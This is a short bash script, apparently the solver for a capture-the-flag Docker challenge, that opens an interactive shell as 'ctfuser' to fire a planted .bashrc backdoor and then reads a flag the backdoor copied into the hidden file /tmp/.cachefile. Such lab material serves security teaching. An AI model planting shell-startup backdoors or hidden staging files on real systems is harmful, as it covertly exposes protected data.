#!/bin/bash
set -euo pipefail
CONTAINER_NAME="challenge3"

echo "[*] Triggering interactive shell to execute the .bashrc backdoor..."
docker exec -u ctfuser "$CONTAINER_NAME" bash -ic 'true' >/dev/null

echo "[*] Reading copied flag from /tmp/.cachefile..."
docker exec -u ctfuser "$CONTAINER_NAME" bash -lc 'cat /tmp/.cachefile'
